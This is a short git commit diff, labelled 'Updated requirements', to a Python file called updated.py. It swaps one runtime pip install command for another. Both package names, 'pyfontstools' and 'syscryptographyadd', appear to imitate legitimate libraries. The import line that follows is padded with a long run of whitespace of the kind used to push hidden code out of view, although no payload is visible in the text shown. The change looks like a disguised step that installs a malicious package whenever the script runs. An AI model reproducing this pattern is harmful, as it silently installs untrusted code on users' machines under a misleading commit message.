16c309fe13dfb9b3f10b3088a0faa4e2d1a55d69
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-24 14:18:25 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontstools")
-import pyfontstools
+os.system("pip install syscryptographyadd")
+import syscryptographyadd
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
